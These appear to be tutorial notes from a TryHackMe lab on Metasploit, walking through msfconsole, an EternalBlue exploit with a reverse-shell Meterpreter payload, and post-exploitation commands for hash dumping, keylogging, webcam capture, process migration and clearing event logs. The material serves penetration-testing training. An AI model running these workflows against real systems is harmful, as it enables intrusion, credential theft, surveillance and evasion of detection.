

# Introduction
Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.
The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

  

The main components of the Metasploit Framework can be summarized as follows;

- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.  
    

  

This tutorial will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system.

# Main Components of Metasploit 


Metasploit is a powerful **penetration testing tool**. You interact with it using the `msfconsole` command in the terminal.

It has different **modules**, each made for a specific task: scanning, exploiting, gaining access, hiding from antivirus, etc.

---

## 🔍 Key Concepts

- **Vulnerability**: A weakness in a system (e.g., a software bug).
    
- **Exploit**: Code that takes advantage of a vulnerability.
    
- **Payload**: What you want the exploit to _do_ (e.g., open a shell, run code, add a user).
    

Example:

> Vulnerability: Outdated Windows SMB  
> Exploit: EternalBlue  
> Payload: Reverse shell (gives you control of the system)

---

##  Metasploit Module Types

Here's what each category does, in simple terms:

### 1. **Auxiliary**

- Tools like **scanners, crawlers, fuzzers**
    
- Not for hacking directly, but to **collect information** or test systems
    
- Found in: `/auxiliary/`
    

### 2. **Encoders**

- Encode payloads to try to **bypass antivirus**
    
- Limited success — antivirus may still catch them
    
- Found in: `/encoders/`
    

### 3. **Evasion**

- Advanced methods to **avoid detection by antivirus or security systems**
    
- Example: bypass Windows Defender, AppLocker
    
- Found in: `/evasion/`
    

### 4. **Exploits**

- Main “weapons” — code that uses vulnerabilities
    
- Categorized by platform (Windows, Linux, Android, etc.)
    
- Found in: `/exploits/`
    

### 5. **NOPs (No Operation)**

- Used to **pad payloads** (make them a certain size)
    
- Instruction `0x90` on x86 CPUs — does nothing
    
- Found in: `/nops/`
    

### 6. **Payloads**

Payloads are what get executed **after an exploit works**.

There are 4 subtypes:

- **Adapters**: Wrap a payload into a different format (like PowerShell)
    
- **Singles**: Self-contained payloads (run on their own)
    
- **Stagers**: Open a connection between target and Metasploit
    
- **Stages**: The actual code downloaded via the stager (bigger payloads)
    

📌 Tip:  
`windows/x64/shell/reverse_tcp` → staged (uses stager + stage)  
`windows/shell_reverse_tcp` → single payload

### 7. **Post**

- **Post-exploitation modules**
    
- Used **after you've gained access** to a system
    
- Example: dump passwords, gather system info
    
- Found in: `/post/`
    


Each module type lives in its own folder:


````swift

/opt/metasploit-framework/embedded/framework/modules/ 
├── auxiliary/
├── encoders/ 
├── evasion/ 
├── exploits/ 
├── nops/
├── payloads/ 
└── post/
````
You don't need to browse these manually — **you'll use them via `msfconsole`**.



# Getting Started with Metasploit Framework (msfconsole)


## Launching Metasploit Console

To start Metasploit's main interface, simply type the following command in your terminal:

```bash
msfconsole
```

Upon execution, you'll be greeted with the Metasploit ASCII art splash screen and version info:

```
=[ metasploit v6.0                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

The prompt will change to:

```bash
msf6 >
```

---

## Using Linux Commands Inside msfconsole

You can execute many Linux commands directly within `msfconsole` using the exec method:

```bash
msf6 > ls
[*] exec: ls
```

This lists your current directory content. Other common commands like `clear`, `ping`, etc., are supported:

```bash
msf6 > ping -c 1 8.8.8.8
```

Note: Output redirection (e.g. `>` or `>>`) is not supported:

```bash
msf6 > help > help.txt
[-] No such command
```

---

## Getting Help and Tracking Commands

To view the help menu:

```bash
msf6 > help
```

To get help for a specific command:

```bash
msf6 > help set
```

To view your command history:

```bash
msf6 > history
```

Tab completion is supported and extremely useful for discovering available commands and modules.

---

## Context Management in Metasploit

Metasploit works by setting a context when you choose a module (e.g. an exploit). This means all parameters set are valid only within that module.

### Example: EternalBlue Exploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

The prompt updates:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Show required options:

```bash
msf6 exploit(...) > show options
```

You will see configuration variables like RHOSTS, RPORT, LHOST, etc.

To return to the main prompt:

```bash
msf6 exploit(...) > back
msf6 >
```

---

## Viewing Module Info

You can get detailed information about a module:

Within module context:

```bash
msf6 exploit(...) > info
```

From the main prompt:

```bash
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

Details include description, disclosure date, author(s), references (e.g. CVEs), and more.

---

## Searching for Modules

One of the most powerful features in Metasploit is the search capability.

### Basic Search:

```bash
msf6 > search ms17-010
```

### Filtered Search:

```bash
msf6 > search type:exploit platform:windows
```

You’ll get results like:

```
#  Name                                      Disclosure Date  Rank    Check  Description
-  ----                                      ---------------  ----    -----  -----------
2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```

To use a module from search results:

```bash
msf6 > use 2
```

---

## Exploit Rankings

Each exploit has a rank that reflects its reliability:

- **Excellent** – Always works, very stable.
    
- **Great** – Reliable but may need some setup.
    
- **Good** – Often works.
    
- **Normal** – Works under some conditions.
    
- **Average** – May require tuning, unstable.
    
- **Low** – Unreliable or crash-prone.
    
- **Manual** – Needs manual steps.
    

Source: [Metasploit Wiki - Exploit Ranking](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

---

## Example Module Usage (EternalBlue)

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Default payload is selected:

```
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Set required options:

```bash
set RHOSTS 10.10.29.187
set LHOST 10.10.220.191
set LPORT 4444
```

View available payloads:

```bash
show payloads
```

Run the exploit:

```bash
run
```

---

## Post-Exploitation Modules

After successfully gaining a session, use post modules:

```bash
use post/windows/gather/enum_domain_users
```

Check options:

```bash
show options
```

Set the session:

```bash
set SESSION 1
run
```


---

##  Understanding the Metasploit Contexts

Depending on what you're doing inside Metasploit, you may encounter five different prompts:

|Prompt Type|Description|
|---|---|
|`root@`|Regular Linux shell prompt — Metasploit commands won't work here.|
|`msf6 >`|Base Metasploit console. No module loaded. Cannot use module-specific commands.|
|`msf6 exploit(...) >`|Context-specific prompt. You can configure and run the selected module.|
|`meterpreter >`|You're inside a Meterpreter session (post-exploitation).|
|`C:\>`|A command shell on the target system. Commands here run on the target.|

---

##  Viewing & Setting Module Options

Before launching a module, always run `show options` to see required and optional parameters.

**Example:**

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

### 📌 Common Parameters

|Parameter|Description|
|---|---|
|`RHOSTS`|Target IP(s), range, or file input. CIDR and range formats supported. Example: `10.10.10.1-10`, `10.10.10.0/24`, or `file:/path/to/list.txt`.|
|`RPORT`|Target port the service is running on (e.g. 80, 445).|
|`PAYLOAD`|Payload to run upon successful exploitation. Often defaults automatically.|
|`LHOST`|Your machine's IP address to receive reverse shell.|
|`LPORT`|Port on your machine for payload to connect back to. Must not be in use.|
|`SESSION`|Session ID used by post-exploitation modules.|

###  Setting and Checking Parameters

**Set a parameter:**

```bash
set RHOSTS 10.10.165.39
```

**Recheck parameters:**

```bash
show options
```

**Unset a parameter or all:**

```bash
unset RHOSTS
unset all
```

---

##  Global Parameters with `setg`

Use `setg` to set values globally, usable across all modules:

```bash
setg RHOSTS 10.10.165.39
```

You can switch between modules without losing this value. To remove:

```bash
unsetg RHOSTS
```

**Workflow Example:**

```bash
use exploit/windows/smb/ms17_010_eternalblue
setg RHOSTS 10.10.165.39
back
use auxiliary/scanner/smb/smb_ms17_010
show options  # RHOSTS already set
```

---

##  Running a Module

###  Available commands:

```bash
exploit       # Run the exploit
run           # Same as exploit, better for scanners
exploit -z    # Run and background session
```

**Output Example:**

```bash
[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186)
```

---

##  Vulnerability Check

Some modules support checking vulnerability without exploiting:

```bash
check
```

---

## 🧭 Managing Sessions

###  Background an Active Session

```bash
meterpreter > background
```

Or:

```
CTRL + Z
```

###  List All Active Sessions

```bash
sessions
```

###  Interact with a Specific Session

```bash
sessions -i 2
```

You’ll now have a Meterpreter or command shell interface with the target.

---

##  Active Sessions Example

```bash
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186
```

---

## 📌 Summary Table

|Command|Purpose|
|---|---|
|`set PARAM VALUE`|Set a module parameter|
|`setg PARAM VALUE`|Set global value across modules|
|`unset PARAM`|Clear a single parameter|
|`unset all`|Clear all parameters for the current module|
|`unsetg PARAM`|Clear a global value|
|`exploit` / `run`|Launch the module|
|`exploit -z`|Launch and background session|
|`check`|Verify if target is vulnerable|
|`sessions`|List all active sessions|
|`sessions -i ID`|Interact with a session|
|`background` / `CTRL+Z`|Background the session|

---

##### ✅ With this detailed understanding of module parameters, context switching, and session control, you're ready to handle Metasploit like a pro. Let me know if you'd like help with advanced Meterpreter commands or writing custom post-exploitation scripts!


##  Using the Metasploit Database (Multi-Target Engagements)

In real-world penetration tests, you’ll likely interact with multiple targets. To simplify this, Metasploit provides **database integration** and **workspaces** for organizing your scans, hosts, services, notes, and vulnerabilities across different environments.

---

###  1. Starting the PostgreSQL Database

> ⚠️ On the TryHackMe AttackBox, this step is already done. Only needed on Kali or custom setups.

Start the PostgreSQL service:
`sudo systemctl start postgresql`

Then initialize the database (as a non-root user):
````bash
sudo -u postgres msfdb init
````

> If a DB already exists, delete it first:
````bash
sudo -u postgres msfdb delete
````

---

### 2. Confirming Database Connection

Inside Metasploit, verify database connection:
````bash
msf6 > db_status [*] Connected to msf. Connection type: postgresql.
````

---

###  3. Organizing Projects with Workspaces

Workspaces help you keep recon and exploitation efforts separate across engagements.

- **List current workspaces:**
````bash
workspace
````

- **Create a new workspace:**
````bash
workspace -a tryhackme
````

- **Switch to a workspace:**
````bash
workspace tryhackme
````

- **Delete a workspace:**
````bash
workspace -d tryhackme
````

- **Rename a workspace:**
````bash
workspace -r tryhackme new_name
````

You’ll see an asterisk `*` next to the current workspace name.

---

###  4. Additional Database Commands

|Command|Purpose|
|---|---|
|`db_nmap`|Run Nmap and store results directly in the DB|
|`hosts`|List discovered hosts|
|`hosts -R`|Automatically set RHOSTS from saved hosts|
|`services`|Show open ports and services|
|`services -S <svc>`|Filter services by name (e.g., `netbios`, `http`)|
|`notes`, `loot`, `vulns`|Analyze collected data|

---

###  Example: Full Workflow with Database

#### ✅ Step-by-step Engagement

1. **Scan the target and store results**
````bash
db_nmap -sV -p- 10.10.12.229
````

2. **View discovered hosts & services**
````bash
hosts services
````


3. **Load vulnerability scanner module**

````bash
use auxiliary/scanner/smb/smb_ms17_010
````

4. **Set RHOSTS automatically from the database**
````bash
hosts -R
````
4. **Verify parameters**
    `show options`

5. **Run the module**
    `run`

6. **Switch to exploitation if vulnerability is found**
    ````bash
use exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.44.70 set LPORT 4444 exploit
````

8. **Manage sessions**
````bash
sessions       # list sessions sessions -i 1  # interact with session 1 background     # send session to background
````

---

###  Service Search Examples

````bash
services -S http       # Search for HTTP services services -S netbios    # Identify SMB/NetBIOS
````

This helps prioritize low-hanging fruit like:

- `FTP` (Anonymous login)
    
- `HTTP` (Web app exploits)
    
- `SMB` (EternalBlue, etc.)
    
- `RDP` (Weak credentials or BlueKeep)



# Meterpreter 

## 🕵️‍♂️ Understanding Meterpreter

**Meterpreter** is a powerful Metasploit payload that provides an advanced shell on the target machine. It operates entirely in memory to maximize stealth, avoid disk-based detection, and support post-exploitation actions in real-time.

---

### 🧬 What Is Meterpreter?

- **Memory-Resident Agent:**  
    Meterpreter runs **entirely in RAM** — it never touches disk storage unless explicitly instructed. This allows it to bypass most antivirus solutions that focus on scanning files.
    
- **Encrypted C2 Channel:**  
    It uses **TLS-encrypted communication** between the attacker (you) and the compromised system, making it harder for intrusion detection/prevention systems (IDS/IPS) to inspect.
    
- **Stealthy Process Injection:**  
    Meterpreter often injects itself into legitimate processes on the target (like `spoolsv.exe`) instead of showing up as `meterpreter.exe`.
    

---

### 🔎 Example: Meterpreter in Action

After exploiting a target (e.g., with MS17-010), you get a session like:

```bash
[*] Meterpreter session 1 opened (10.10.44.70:4444 -> 10.10.12.229:49186)
```

#### ✅ Check Which Process Meterpreter Is Running In

```bash
meterpreter > getpid
Current pid: 1304
```

#### 🧾 List Running Processes

```bash
meterpreter > ps
Process List ============
 PID   PPID  Name         User                    Path
 ----  ----  ----         ----                    ----
 1304  692   spoolsv.exe  NT AUTHORITY\SYSTEM     C:\Windows\System32\spoolsv.exe
 .
 .
 .
 .
 .
 ```

Note: Even though Meterpreter is running, there's **no `meterpreter.exe` process**.

---

### 🧠 DLL Inspection

Even inspecting the DLLs loaded by the Meterpreter-injected process (e.g., `spoolsv.exe`) won't reveal obvious signs of Meterpreter:

```bash
C:\> tasklist /m /fi "pid eq 1304"
```

This shows standard DLLs like:

```
ntdll.dll, kernel32.dll, ole32.dll, wininet.dll, ...
```

No trace of `meterpreter.dll` or anything suspicious — this adds to Meterpreter’s stealth.

---

## 🧬 Meterpreter Payload Variants

Meterpreter payloads are available in many forms — based on operating system, connection method, and whether they are **staged** or **inline**.

### 🔄 Staged vs Inline Payloads

|Type|Description|
|---|---|
|**Staged**|The payload is delivered in **two phases**: a small stager is sent first, which then pulls in the full payload from the attacker. Smaller size, good for exploits with limited space.|
|**Inline (Single)**|Entire payload is delivered in **one step**. Simpler setup but larger in size.|

---

### 📦 Listing Meterpreter Payloads with `msfvenom`

To see available Meterpreter payloads across platforms:

```bash
msfvenom --list payloads | grep meterpreter
```

Example Output Snippet:

```
android/meterpreter/reverse_tcp
linux/x86/meterpreter_reverse_http
windows/x64/meterpreter/bind_tcp
...
```

You’ll find payloads for:

- **Android**
    
- **Apple iOS**
    
- **Java**
    
- **Linux**
    
- **OSX**
    
- **PHP**
    
- **Python**
    
- **Windows**
    
---

### 🧠 Choosing the Right Meterpreter Payload

When selecting a payload, consider the following:

| Factor                  | Example Questions                                                        |
| ----------------------- | ------------------------------------------------------------------------ |
| **Target OS**           | Is it Windows? Linux? Android? iOS?                                      |
| **Runtime Environment** | Is Python installed? Is it a PHP site?                                   |
| **Network Access**      | Can we make reverse TCP connections? Only HTTPS? Is IPv6 less monitored? |

---

### ⚙️ Default Payloads in Exploits

Many exploit modules come preconfigured with a default Meterpreter payload.

Example:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

To view other compatible payloads:

```bash
show payloads
```

Example Output:

```
6   windows/x64/meterpreter/bind_ipv6_tcp
7   windows/x64/meterpreter/bind_named_pipe
...
```

You can then select a different payload:

```bash
set PAYLOAD windows/x64/meterpreter/bind_named_pipe
```

---
## Meterpreter Command Categories and Usage

When a Meterpreter session is established, the prompt changes to `meterpreter >`. Typing the `help` command (or `?`) at this prompt will display all available commands categorized by functionality. The command list may vary depending on the operating system and the payload used.

Example:

```
meterpreter > help
```

The help output is grouped into categories, including:

- Core commands
    
- File system commands
    
- Networking commands
    
- System commands
    
- User interface commands
    
- Webcam commands
    
- Audio output commands
    
- Elevate commands
    
- Password database commands
    
- Timestomp commands
    

These categories reflect built-in functionality present in the specific version of Meterpreter in use. Not all commands will be available on every system, and some require particular hardware or services on the target.

---

## 1. Core Commands

These commands provide fundamental control over the Meterpreter session.

|Command|Description|
|---|---|
|`?` or `help`|Displays help information for available commands|
|`background`|Backgrounds the current session and returns to the Metasploit console|
|`bg`|Alias for `background`|
|`bgkill`|Terminates a background Meterpreter script|
|`bglist`|Lists all running background scripts|
|`bgrun`|Executes a script in the background|
|`channel`|Manages active channels|
|`close`|Closes a channel|
|`exit`|Terminates the current Meterpreter session|
|`guid`|Displays the globally unique session identifier (GUID)|
|`info`|Displays information about a specific post-exploitation module|
|`irb`|Opens an interactive Ruby shell bound to the current session|
|`load`|Loads Meterpreter extensions|
|`migrate`|Migrates Meterpreter to a different process on the target|
|`run`|Executes a Meterpreter script or post-exploitation module|
|`sessions`|Interacts with or lists existing sessions|

---

## 2. File System Commands

Commands that allow interaction with the file system of the target.

|Command|Description|
|---|---|
|`cd`|Change current directory|
|`ls`|List directory contents|
|`dir`|Alias for `ls`|
|`pwd`|Print working directory|
|`cat`|View contents of a file|
|`edit`|Edit a file|
|`rm`|Delete a file|
|`search`|Search for files|
|`upload`|Upload file or directory from attacker to target|
|`download`|Download file or directory from target|

---

## 3. Networking Commands

Networking-related commands provide information and manipulation capabilities for the target’s network configuration.

|Command|Description|
|---|---|
|`arp`|Display ARP cache|
|`ifconfig`|Show network interfaces|
|`netstat`|Display active network connections|
|`portfwd`|Forward local port to a service on the target|
|`route`|View or modify the routing table|

---

## 4. System Commands

Commands to interact with the target operating system and its processes.

|Command|Description|
|---|---|
|`clearev`|Clears the Windows Event Log|
|`execute`|Executes a command|
|`getpid`|Shows PID (process ID) of current Meterpreter session|
|`getuid`|Shows the user account that the session is running under|
|`kill`|Terminates a process by PID|
|`pkill`|Terminates processes by name|
|`ps`|Lists running processes|
|`reboot`|Reboots the target system|
|`shell`|Opens a command shell on the target|
|`shutdown`|Shuts down the target system|
|`sysinfo`|Displays system information (OS, architecture, etc.)|

---

## 5. Other Commands and Features

These commands often depend on extensions or specific capabilities of the target device.

|Command|Description|
|---|---|
|`idletime`|Returns number of seconds of user inactivity|
|`keyscan_start`|Begins keylogging|
|`keyscan_stop`|Stops keylogging|
|`keyscan_dump`|Dumps collected keystrokes|
|`screenshare`|Live desktop stream of the target|
|`screenshot`|Capture a static image of the target’s desktop|
|`record_mic`|Record audio from target microphone|
|`webcam_list`|List available webcams|
|`webcam_snap`|Take a snapshot with the webcam|
|`webcam_stream`|Stream webcam video in real-time|
|`webcam_chat`|Initiate webcam-based chat session|
|`getsystem`|Attempt privilege escalation to SYSTEM|
|`hashdump`|Dump hashes from the Security Account Manager (SAM)|

---

## Notes

- **Command Availability**: Not all commands are guaranteed to work. For example, webcam commands require the target to have a functional webcam.
    
- **Extensions**: Some functionality requires loading extensions with the `load` command (e.g., `load kiwi` for mimikatz-like functionality).
    
- **Limitations**: Commands like `screenshot`, `record_mic`, or `webcam_stream` will fail silently or with errors if the device lacks those components or is running headless.
    


---

## Commonly Used Meterpreter Commands for Post-Exploitation

During the post-exploitation phase of an engagement, the Meterpreter shell offers a wide range of built-in commands. These commands allow interaction with the file system, system processes, user accounts, and more. Below are commonly used Meterpreter commands, each explained in a clear, technical manner.

---

### 1. `help` — Display Command Reference

**Purpose**:  
Displays all available Meterpreter commands for the current session. Since Meterpreter versions vary depending on the payload and target system, the available commands may differ.

**Example**:

```bash
meterpreter > help
```

---

### 2. `getuid` — Display Current User Context

**Purpose**:  
Shows the username that the Meterpreter session is currently running as. Useful to determine privilege level (e.g., `NT AUTHORITY\SYSTEM` vs. regular user).

**Example**:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

### 3. `ps` — List Running Processes

**Purpose**:  
Lists all processes running on the target system. Includes process name, PID (Process ID), session, user context, and path. The PID is required for the `migrate` command.

**Example**:

```bash
meterpreter > ps
```

_Output excerpt:_

```
 PID   PPID  Name        Arch  Session  User                  Path
 ----  ----  ----        ----  -------  ----                  ----
 1304  692   spoolsv.exe x64   0        NT AUTHORITY\SYSTEM   C:\Windows\System32\spoolsv.exe
 716   596   lsass.exe   x64   0        NT AUTHORITY\SYSTEM   C:\Windows\system32\lsass.exe
```

---

### 4. `migrate` — Migrate to Another Process

**Purpose**:  
Migrates the Meterpreter session to a different process on the target system. Useful to stabilize the session or to attach to processes handling user input (e.g., for keylogging).

**Syntax**:

```bash
meterpreter > migrate <PID>
```

**Example**:

```bash
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```

**Caution**:  
Migrating from a privileged process (e.g., SYSTEM) to a low-privileged one (e.g., web server process) may cause loss of elevated permissions.

---

### 5. `hashdump` — Extract SAM Database

**Purpose**:  
Retrieves NTLM password hashes from the Security Account Manager (SAM) database on Windows systems. These hashes can be used for offline cracking or Pass-the-Hash attacks.

**Example**:

```bash
meterpreter > hashdump
```

_Output example:_

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

### 6. `search` — Search for Files

**Purpose**:  
Searches for files on the target file system. Useful for locating flags, credentials, or other artifacts.

**Syntax**:

```bash
meterpreter > search -f <filename>
```

**Example**:

```bash
meterpreter > search -f flag2.txt
```

_Sample Output_:

```
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```

---

### 7. `shell` — Launch Interactive System Shell

**Purpose**:  
Spawns a standard command-line interface (e.g., CMD on Windows or `/bin/sh` on Linux) on the target system.

**Example**:

```bash
meterpreter > shell
```

_Sample Output_:

```
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

To return to the Meterpreter prompt, press `CTRL + Z`.

---
### ✅ Final Takeaway

Metasploit is more than just an exploit tool — it’s a **full-featured exploitation and post-exploitation platform**. From scanning and exploiting targets to managing sessions and extracting data, it offers a complete offensive toolkit.

By mastering its modules, payloads, Meterpreter capabilities, and database features, you now have the skills to:

- Execute real-world penetration tests
    
- Succeed in CTF challenges
    
- Conduct post-exploitation analysis stealthily and efficiently
    

> 🔓 **Metasploit makes exploitation easy — your responsibility is to use it ethically, skillfully, and strategically**
